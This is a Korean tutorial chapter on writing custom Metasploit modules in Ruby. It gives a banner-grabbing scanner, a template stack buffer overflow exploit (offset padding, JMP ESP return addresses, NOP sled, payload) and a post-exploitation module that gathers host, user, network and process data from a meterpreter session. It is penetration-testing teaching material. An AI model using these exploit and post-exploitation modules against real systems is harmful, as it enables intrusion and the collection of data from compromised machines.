Chapter 09

커스텀 모듈 개발

Ruby로 나만의 Metasploit 모듈 만들기 — Auxiliary 스캐너, Exploit 모듈, Post 모듈의 구조와 MSF API 활용법

💡
이 챕터의 목표

기존 모듈을 사용하는 것에서 벗어나, 직접 모듈을 작성하여 특수한 상황에 대응하고 Metasploit의 강력한 API를 활용할 수 있게 됩니다. Ruby 기초 지식이 있으면 도움이 되지만 필수는 아닙니다.

🏗️ MSF 모듈 구조 개요

Metasploit 모듈은 모두 Ruby로 작성되며, 공통 믹스인(Mixin) 체계를 상속받아 일관된 인터페이스를 제공합니다. 모듈 유형에 따라 상속받는 기반 클래스가 다릅니다.

📁
모듈 저장 위치

커스텀 모듈은 MSF 코어 디렉토리가 아닌 ~/.msf4/modules/에 저장하세요. MSF 업데이트 시 덮어씌워지지 않습니다.

🔄
모듈 불러오기

파일 저장 후 reload_all 또는 loadpath ~/.msf4/modules 명령으로 MSF에 즉시 반영됩니다.

📂 커스텀 모듈 디렉토리 구조 
~/.msf4/modules/
├── auxiliary/
│   ├── scanner/      ← 스캐너 모듈
│   └── gather/       ← 정보 수집 모듈
├── exploits/
│   ├── linux/
│   └── windows/
├── post/
│   ├── linux/
│   └── windows/
└── payloads/

🔧 Auxiliary 모듈 작성

가장 간단한 형태인 Auxiliary 모듈부터 시작합니다. 아래는 특정 포트가 열려있는지 확인하고 배너를 가져오는 스캐너 모듈입니다.

💎 simple_banner_scanner.rb 
##
# 커스텀 배너 그래버 모듈
# 저장 위치: ~/.msf4/modules/auxiliary/scanner/simple_banner_scanner.rb
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  # Mixin 포함: TCP 소켓, 스캐너 기능
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Simple Banner Grabber',
      'Description' => '연결 후 배너를 수집하는 간단한 스캐너',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))

    # 옵션 등록
    register_options([
      Opt::RPORT(80),
      OptInt.new('TIMEOUT', [true, '연결 타임아웃(초)', 10]),
      OptString.new('SEND_DATA', [false, '전송할 문자열', 'HEAD / HTTP/1.0\r\n\r\n'])
    ])
  end

  # 스캐너 각 호스트에 대해 실행되는 메서드
  def run_host(ip)
    begin
      # TCP 연결
      connect

      # 데이터 전송
      sock.put(datastore['SEND_DATA']) if datastore['SEND_DATA']

      # 응답 수신
      banner = sock.get_once(-1, datastore['TIMEOUT'])

      if banner
        banner = banner.gsub(/[\r\n]+/, ' ').strip[0..200]
        print_good("#{ip}:#{rport} — #{banner}")

        # 결과를 MSF DB에 저장
        report_service(
          host:  ip,
          port:  rport,
          proto: 'tcp',
          info:  banner
        )
      else
        print_status("#{ip}:#{rport} — 응답 없음")
      end

    rescue ::Rex::ConnectionRefused
      print_error("#{ip}:#{rport} — 연결 거부")
    rescue ::Rex::ConnectionTimeout
      print_error("#{ip}:#{rport} — 타임아웃")
    ensure
      disconnect
    end
  end
end

💥 Exploit 모듈 작성

실제 취약점을 익스플로잇하는 모듈입니다. 아래는 스택 버퍼 오버플로우를 이용한 간단한 TCP 익스플로잇 모듈 구조입니다.

💎 custom_bof_exploit.rb — 기본 구조 
##
# 커스텀 스택 BOF 익스플로잇 모듈 (구조 예시)
##
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Buffer Overflow',
      'Description'    => 'Custom vulnerable service BOF exploit',
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Targets' => [
        ['Windows XP SP3', { 'Ret' => 0x7C941EED }],
        ['Windows 7 SP1',  { 'Ret' => 0x6250AF11 }],
      ],
      'DefaultTarget'  => 0,
      'References' => [
        ['CVE', '2024-XXXXX'],
      ],
      'DisclosureDate' => '2024-01-01'
    ))

    register_options([Opt::RPORT(9999)])
  end

  def exploit
    # 페이로드 생성
    buf  = "A" * 2006                   # EIP까지 오프셋
    buf += [target['Ret']].pack('V')  # EIP 덮어쓰기 (JMP ESP 주소)
    buf += make_nops(16)               # NOP sled
    buf += payload.encoded                # 쉘코드

    print_status("Sending buffer (#{buf.length} bytes)...")

    connect
    sock.put(buf)
    handler   # 연결 수신 대기
    disconnect
  end
end
🛠️
MSF 패턴 생성으로 오프셋 찾기

EIP까지의 정확한 오프셋을 구하려면 msf-pattern_create -l 3000으로 패턴을 생성하고, 크래시 주소를 msf-pattern_offset -q <주소>로 분석합니다.

🔧 Post 모듈 작성

이미 획득한 세션에서 실행되는 Post 모듈입니다. 아래는 시스템 정보를 자동으로 수집하여 파일로 저장하는 예시입니다.

💎 gather_sysinfo.rb — Post 모듈 
##
# 시스템 정보 자동 수집 Post 모듈
# 저장 위치: ~/.msf4/modules/post/multi/gather/gather_sysinfo.rb
##
require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry  # Windows 전용

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Multi Gather System Information',
      'Description' => '시스템 기본 정보를 수집하여 로컬에 저장합니다',
      'License'     => MSF_LICENSE,
      'Author'      => ['Your Name'],
      'Platform'    => ['win', 'linux'],
      'SessionTypes' => ['meterpreter']
    ))
  end

  def run
    print_status("수집 시작: #{session.sys.config.sysinfo['Computer']}")

    report = []
    report << "=== 시스템 정보 ==="
    report << "호스트: #{session.sys.config.sysinfo['Computer']}"
    report << "OS: #{session.sys.config.sysinfo['OS']}"
    report << "사용자: #{session.sys.config.getuid}"
    report << ""

    # 네트워크 정보 수집
    report << "=== 네트워크 인터페이스 ==="
    session.net.config.interfaces.each do |iface|
      report << "  #{iface.name}: #{iface.addrs.join(', ')}"
    end

    # 실행 중인 프로세스 (처음 10개만)
    report << ""
    report << "=== 프로세스 목록 (상위 10개) ==="
    session.sys.process.get_processes[0..9].each do |proc|
      report << "  [#{proc['pid']}] #{proc['name']}"
    end

    # 결과를 로컬 파일에 저장
    outfile = "#{Msf::Config.log_directory}/sysinfo_#{Time.now.strftime('%Y%m%d_%H%M%S')}.txt"
    File.write(outfile, report.join("\n"))
    print_good("결과 저장: #{outfile}")
  end
end

🧰 핵심 MSF API 레퍼런스

모듈 개발 시 자주 사용하는 MSF API를 정리합니다.

💬 출력 메서드 
# 상태 메시지 (흰색 [*])
print_status("스캔 중...")

# 성공 메시지 (녹색 [+])
print_good("취약점 발견!")

# 경고 메시지 (노란색 [!])
print_warning("응답이 느립니다")

# 에러 메시지 (빨간색 [-])
print_error("연결 실패")

# 디버그 메시지 (verbose 모드에서만 출력)
vprint_status("디버그 정보")
vprint_good("상세 결과")

# 라인 직접 출력
print_line("일반 텍스트")
🌐 네트워크 API 
# TCP 연결 (Msf::Exploit::Remote::Tcp 포함 시)
connect                    # RHOST:RPORT로 연결
connect(true, {           # 옵션 지정
  'RHOST' => '10.10.10.1',
  'RPORT' => 443
})
sock.put(data)            # 데이터 전송
sock.get_once             # 응답 수신
sock.get_once(-1, timeout) # 타임아웃 지정
disconnect                 # 연결 종료

# UDP (Msf::Exploit::Remote::Udp 포함 시)
udp_sock.sendto(data, host, port)
udp_sock.recvfrom(timeout)

# HTTP (Msf::Exploit::Remote::HttpClient 포함 시)
res = send_request_cgi({
  'method'  => 'GET',
  'uri'     => '/admin/',
  'headers' => { 'User-Agent' => 'Mozilla/5.0' }
})
print_good(res.body) if res && res.code == 200

# 호스트 정보 저장
report_host(host: ip, os_name: 'Windows', os_sp: 'SP3')

🧪 모듈 디버깅 팁

🐛 개발 및 디버깅 워크플로우 
# 1. Ruby 문법 오류 사전 검사
$ ruby -c ~/.msf4/modules/auxiliary/scanner/my_module.rb
Syntax OK

# 2. MSF에서 모듈 로드 후 info 확인
msf6 > reload_all
msf6 > use auxiliary/scanner/my_module
msf6 auxiliary(my_module) > info

# 3. verbose 모드로 실행
msf6 auxiliary(my_module) > set VERBOSE true
msf6 auxiliary(my_module) > run

# 4. pry 디버거 삽입 (대화형 디버깅)
# 코드 내 원하는 위치에 삽입:
require 'pry'; binding.pry

# 5. MSF 로그 확인
$ tail -f ~/.msf4/logs/framework.log

공식 모듈 코드로 배우기
